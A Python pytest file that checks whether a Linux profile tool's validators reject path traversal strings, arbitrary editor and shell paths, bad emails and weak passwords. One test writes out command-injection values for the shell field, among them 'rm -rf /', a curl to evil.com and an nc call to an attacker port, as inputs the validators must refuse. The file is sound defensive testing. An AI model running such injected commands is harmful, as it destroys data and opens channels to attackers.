"""
Security-focused validator tests.

These tests exercise malicious inputs that the validators should reject:
- Path traversal (../../etc/evil)
- Arbitrary binary paths for shell/editor
- Invalid email formats
- Missing password strength checks

Related issues: #205, #207, #209, #210, #211
"""

import re
from os import makedirs

import pytest

from linux_profile.base.settings import Settings
from linux_profile.base.error import (
    ErrorArgumentIsInvalid,
    ErrorOptionIsMissing,
)
from linux_profile.validators.input_file import InputAddFile
from linux_profile.validators.input_config import InputConfig
from linux_profile.validators.input_profile import InputProfile
from linux_profile.validators.input_account import InputAccount


# ── Helpers ──────────────────────────────────────────────────────────────

_PATH_TRAVERSAL_INPUTS = [
    "../../etc/passwd",
    "../../etc/shadow",
    "../../../etc/evil",
    "..\\..\\windows\\system32",
    "foo/../../etc/passwd",
    "/etc/passwd",
]


def _is_safe_filename(value: str) -> bool:
    """Check that a filename doesn't contain path traversal characters."""
    if ".." in value:
        return False
    if "/" in value or "\\" in value:
        return False
    if value.startswith("."):
        # Allow .json suffix patterns but reject hidden-file-like inputs
        pass
    return True


def _is_safe_profile_name(value: str) -> bool:
    """Check that a profile name stays within the profile directory."""
    if ".." in value:
        return False
    if "/" in value or "\\" in value:
        return False
    return True


# ── InputAddFile: validator_name path traversal ─────────────────────────

class TestInputAddFileSecurity:
    """Tests for InputAddFile security — issue #205."""

    def test_validator_name_rejects_path_traversal(self):
        """validator_name should reject inputs containing '..' (path traversal)."""
        for payload in _PATH_TRAVERSAL_INPUTS:
            # Strip extension to avoid unrelated errors
            name = payload.replace(".json", "")
            with pytest.raises(ErrorArgumentIsInvalid):
                InputAddFile(**{"name": name})

    def test_validator_name_rejects_absolute_path(self):
        """validator_name should reject absolute paths like /etc/passwd."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputAddFile(**{"name": "/etc/passwd"})

    def test_validator_name_accepts_normal_filename(self):
        """validator_name should accept plain filenames."""
        fields = InputAddFile(**{"name": "my_config.txt"})
        assert fields.name == "my_config.txt"

    def test_validator_name_strips_directory_components(self):
        """validator_name with 'dir/file.txt' should either reject or strip the directory."""
        # Either behavior is acceptable — reject or sanitize
        try:
            fields = InputAddFile(**{"name": "subdir/file.txt"})
            # If it passes, the name should NOT contain '/'
            assert "/" not in fields.name
        except ErrorArgumentIsInvalid:
            pass  # Also acceptable — outright rejection


# ── InputConfig: validator_editor / validator_shell ─────────────────────

class TestInputConfigSecurity:
    """Tests for InputConfig security — issue #207."""

    def test_validator_editor_rejects_arbitrary_path(self):
        """validator_editor should reject paths outside allowed editor list."""
        for payload in ["/tmp/evil_script", "/usr/bin/malicious", "../../bin/evil"]:
            with pytest.raises(ErrorArgumentIsInvalid):
                InputConfig(**{"editor": payload})

    def test_validator_editor_accepts_known_editors(self):
        """validator_editor should accept common editor names."""
        for editor in ["vim", "nano", "vi", "emacs", "code"]:
            fields = InputConfig(**{"editor": editor})
            assert fields.editor == editor

    def test_validator_shell_rejects_arbitrary_path(self):
        """validator_shell should reject arbitrary shell paths."""
        for payload in ["/tmp/reverse_shell.sh", "/usr/bin/evil", "../../bin/sh"]:
            with pytest.raises(ErrorArgumentIsInvalid):
                InputConfig(**{"shell": payload})

    def test_validator_shell_accepts_known_shells(self):
        """validator_shell should accept common shell names."""
        for shell in ["bash", "zsh", "fish", "sh"]:
            fields = InputConfig(**{"shell": shell})
            assert fields.shell == shell

    def test_validator_editor_rejects_whitespace_only(self):
        """validator_editor should reject whitespace-only values."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputConfig(**{"editor": "  "})

    def test_validator_shell_rejects_semicolon_injection(self):
        """validator_shell should reject command injection attempts."""
        for payload in ["bash; rm -rf /", "sh && curl evil.com", "zsh | nc attacker 4444"]:
            with pytest.raises(ErrorArgumentIsInvalid):
                InputConfig(**{"shell": payload})


# ── InputProfile: path traversal in new/delete/switch ───────────────────

class TestInputProfileSecurity:
    """Tests for InputProfile path traversal — issues #209, #210."""

    def test_validator_new_rejects_path_traversal(self):
        """validator_new should reject filenames with '..' components."""
        for payload in ["../../etc/evil.json", "../../../tmp/backdoor.json"]:
            with pytest.raises(ErrorArgumentIsInvalid):
                InputProfile(**{"new": payload})

    def test_validator_new_rejects_absolute_path(self):
        """validator_new should reject absolute paths."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputProfile(**{"new": "/etc/evil.json"})

    def test_validator_new_rejects_directory_traversal_without_json(self):
        """validator_new should reject '../' even without .json extension."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputProfile(**{"new": "../../etc/passwd"})

    def test_validator_delete_rejects_path_traversal(self):
        """validator_delete should reject filenames with '..' components."""
        for payload in ["../../etc/evil.json", "../../../tmp/malicious.json"]:
            with pytest.raises(ErrorArgumentIsInvalid):
                InputProfile(**{"delete": payload})

    def test_validator_delete_rejects_absolute_path(self):
        """validator_delete should reject absolute paths."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputProfile(**{"delete": "/etc/passwd.json"})

    def test_validator_switch_rejects_path_traversal(self):
        """validator_switch should reject filenames with '..' components."""
        for payload in ["../../etc/evil.json", "../../../tmp/hijack.json"]:
            with pytest.raises(ErrorArgumentIsInvalid):
                InputProfile(**{"switch": payload})

    def test_validator_new_accepts_safe_filename(self):
        """validator_new should accept normal .json filenames."""
        fields = InputProfile(**{"new": "safe_profile.json"})
        assert fields.new.name == "safe_profile.json"

    def test_validator_new_rejects_hidden_directory_traversal(self):
        """validator_new should reject inputs like 'foo/../../evil.json'."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputProfile(**{"new": "foo/../../evil.json"})

    def test_validator_output_rejects_path_traversal(self):
        """validator_output should reject directory traversal in output filename."""
        # output requires .json extension, but traversal with .json should still fail
        with pytest.raises(ErrorArgumentIsInvalid):
            InputProfile(**{"output": "../../etc/evil.json"})


# ── InputAccount: email and password validation ─────────────────────────

class TestInputAccountSecurity:
    """Tests for InputAccount security — issue #211."""

    def test_validator_email_rejects_missing_at_sign(self):
        """validator_email should reject emails without '@'."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputAccount(**{"email": "not-an-email", "password": "ValidP@ss1"})

    def test_validator_email_rejects_empty_domain(self):
        """validator_email should reject 'user@' with no domain."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputAccount(**{"email": "user@", "password": "ValidP@ss1"})

    def test_validator_email_rejects_empty_local(self):
        """validator_email should reject '@domain.com' with no local part."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputAccount(**{"email": "@domain.com", "password": "ValidP@ss1"})

    def test_validator_email_rejects_spaces(self):
        """validator_email should reject emails with spaces."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputAccount(**{"email": "user @domain.com", "password": "ValidP@ss1"})

    def test_validator_email_accepts_valid_email(self):
        """validator_email should accept properly formatted emails."""
        fields = InputAccount(**{"email": "user@example.com", "password": "ValidP@ss1"})
        assert fields.email == "user@example.com"

    def test_validator_password_rejects_too_short(self):
        """validator_password should reject passwords shorter than 8 characters."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputAccount(**{"email": "user@example.com", "password": "short"})

    def test_validator_password_rejects_common_passwords(self):
        """validator_password should reject well-known weak passwords."""
        for weak in ["password", "12345678", "qwerty123", "admin123"]:
            with pytest.raises(ErrorArgumentIsInvalid):
                InputAccount(**{"email": "user@example.com", "password": weak})

    def test_validator_password_accepts_strong_password(self):
        """validator_password should accept reasonably strong passwords."""
        fields = InputAccount(**{"email": "user@example.com", "password": "MyS3cur3P@ss!"})
        assert fields.password == "MyS3cur3P@ss!"

    def test_validator_password_rejects_single_type(self):
        """validator_password should reject all-lowercase or all-numeric passwords."""
        with pytest.raises(ErrorArgumentIsInvalid):
            InputAccount(**{"email": "user@example.com", "password": "alllowercase"})
        with pytest.raises(ErrorArgumentIsInvalid):
            InputAccount(**{"email": "user@example.com", "password": "12345678"})
